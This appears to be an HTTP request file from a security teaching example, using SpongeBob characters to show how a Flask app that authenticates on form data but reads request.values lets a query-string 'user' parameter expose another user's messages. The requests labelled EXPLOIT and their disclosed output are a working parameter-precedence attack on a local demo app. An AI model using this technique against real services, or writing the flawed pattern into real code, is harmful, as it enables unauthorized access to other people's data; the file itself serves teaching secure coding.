@base = http://localhost:8000/ii/source-precedence/example7

### SpongeBob authenticates via form body and retrieves his messages
POST {{base}}
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton discovers request.values merges query and form data
### Authentication uses form-only, but data retrieval uses request.values (query takes precedence!)
POST {{base}}?user=squidward
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }

###

### The attack also works with GET (if endpoint accepts both methods):
GET {{base}}?user=squidward
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in data disclosure (same as above)
#
# IMPACT: Flask's request.values.get() merges form and query parameters with query
# taking precedence! Plankton authenticates as SpongeBob using form credentials,
# but request.values reads "squidward" from the query string for data retrieval.
# This is particularly dangerous because request.values looks like a convenience
# feature but silently introduces exploitable precedence rules.
